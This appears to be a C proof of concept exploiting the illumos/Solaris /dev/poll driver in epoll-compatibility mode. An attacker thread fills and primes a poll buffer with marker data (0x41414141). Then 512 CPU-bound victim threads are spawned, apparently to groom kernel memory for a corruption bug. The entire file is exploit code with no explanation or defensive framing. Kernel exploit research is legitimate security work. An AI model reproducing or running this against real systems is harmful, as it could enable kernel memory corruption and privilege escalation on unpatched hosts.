#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/devpoll.h>
#include <sys/epoll.h>
#include <sys/lwp.h>
#include <sys/processor.h>
#include <sys/types.h>
#include <unistd.h>

#define VICTIMS 512
#define FIRST_WAVE 32
#define READY_FDS 32
#define PRIME_EVENTS 12

typedef struct worker {
    int pair_id;
    int role;
    int dpfd;
    int fds[READY_FDS][2];
    volatile int ready;
    volatile int primed;
} worker_t;

enum {
    ROLE_ATTACKER = 1,
    ROLE_VICTIM = 2,
};

static pthread_barrier_t g_barrier;
static worker_t g_workers[VICTIMS + 1];
static volatile int g_prime_now;

static void
die(const char *msg)
{
    perror(msg);
    exit(1);
}

static void
devpoll_add_epoll(int dpfd, int fd, uint32_t events, uint64_t data)
{
    dvpoll_epollfd_t ev;
    ssize_t n;

    memset(&ev, 0, sizeof (ev));
    ev.dpep_pollfd.fd = fd;
    ev.dpep_pollfd.events = (short)events;
    ev.dpep_data = data;

    n = write(dpfd, &ev, sizeof (ev));
    if (n != sizeof (ev)) {
        fprintf(stderr, "write(/dev/poll) failed: %zd errno=%d\n", n, errno);
        exit(1);
    }
}

static void
prime_dpbuf(worker_t *w, nfds_t nfds)
{
    dvpoll_t dvp;
    struct epoll_event events[READY_FDS];
    int rv;

    memset(&dvp, 0, sizeof (dvp));
    dvp.dp_fds = (pollfd_t *)events;
    dvp.dp_nfds = nfds;
    dvp.dp_timeout = 0;

    rv = ioctl(w->dpfd, DP_POLL, &dvp);
    if (rv < 0) {
        perror("ioctl(DP_POLL)");
        exit(1);
    }
}

static void *
attacker_main(void *arg)
{
    worker_t *w = arg;
    char ch = 'A';

    (void) processor_bind(P_LWPID, P_MYID, 0, NULL);

    w->dpfd = open("/dev/poll", O_RDWR);
    if (w->dpfd < 0)
        die("open /dev/poll attacker");

    if (ioctl(w->dpfd, DP_EPOLLCOMPAT, NULL) != 0)
        die("ioctl DP_EPOLLCOMPAT attacker");

    for (int i = 0; i < READY_FDS; i++) {
        uint64_t data = 0x4141414100000000ULL | ((uint64_t)w->pair_id << 16) |
            (uint64_t)i;

        if (pipe(w->fds[i]) != 0)
            die("pipe attacker");
        if (write(w->fds[i][1], &ch, 1) != 1)
            die("write pipe attacker");

        devpoll_add_epoll(w->dpfd, w->fds[i][0], EPOLLIN, data);
    }

    while (!g_prime_now)
        usleep(1000);

    prime_dpbuf(w, PRIME_EVENTS);
    w->primed = 1;

    fprintf(stdout, "attacker pair=%d lwp=%d dpfd=%d primed\n",
        w->pair_id, _lwp_self(), w->dpfd);
    fflush(stdout);

    pthread_barrier_wait(&g_barrier);
    w->ready = 1;

    for (;;)
        pause();

    return (NULL);
}

static void *
victim_main(void *arg)
{
    worker_t *w = arg;
    struct pollfd pfd;
    char ch = 'V';

    (void) processor_bind(P_LWPID, P_MYID, 0, NULL);

    w->dpfd = open("/dev/poll", O_RDWR);
    if (w->dpfd < 0)
        die("open /dev/poll victim");

    if (ioctl(w->dpfd, DP_EPOLLCOMPAT, NULL) != 0)
        die("ioctl DP_EPOLLCOMPAT victim");

    if (pipe(w->fds[0]) != 0)
        die("pipe victim");
    if (write(w->fds[0][1], &ch, 1) != 1)
        die("write pipe victim");

    memset(&pfd, 0, sizeof (pfd));
    pfd.fd = w->fds[0][0];
    pfd.events = POLLIN;

    if (poll(&pfd, 1, 0) < 0)
        die("poll victim");

    if ((w->pair_id % 64) == 0) {
        fprintf(stdout, "victim batch pair=%d lwp=%d\n",
            w->pair_id, _lwp_self());
        fflush(stdout);
    }

    pthread_barrier_wait(&g_barrier);
    w->ready = 1;

    for (;;)
        pause();

    return (NULL);
}

int
main(void)
{
    pthread_t threads[VICTIMS + 1];

    if (pthread_barrier_init(&g_barrier, NULL, VICTIMS + 2) != 0)
        die("pthread_barrier_init");

    printf("pid=%d\n", getpid());
    fflush(stdout);

    memset(&g_workers[0], 0, sizeof (g_workers[0]));
    g_workers[0].pair_id = 0;
    g_workers[0].role = ROLE_ATTACKER;

    if (pthread_create(&threads[0], NULL, attacker_main, &g_workers[0]) != 0)
        die("pthread_create attacker");
    usleep(50000);

    for (int i = 0; i < FIRST_WAVE; i++) {
        worker_t *v = &g_workers[i + 1];

        memset(v, 0, sizeof (*v));
        v->pair_id = i;
        v->role = ROLE_VICTIM;

        if (pthread_create(&threads[i + 1], NULL, victim_main, v) != 0)
            die("pthread_create victim");
        usleep(5000);
    }

    g_prime_now = 1;
    usleep(50000);

    for (int i = FIRST_WAVE; i < VICTIMS; i++) {
        worker_t *v = &g_workers[i + 1];

        memset(v, 0, sizeof (*v));
        v->pair_id = i;
        v->role = ROLE_VICTIM;

        if (pthread_create(&threads[i + 1], NULL, victim_main, v) != 0)
            die("pthread_create victim");
        usleep(5000);
    }

    pthread_barrier_wait(&g_barrier);
    printf("all_threads_ready\n");
    fflush(stdout);

    for (;;)
        pause();

    return (0);
}
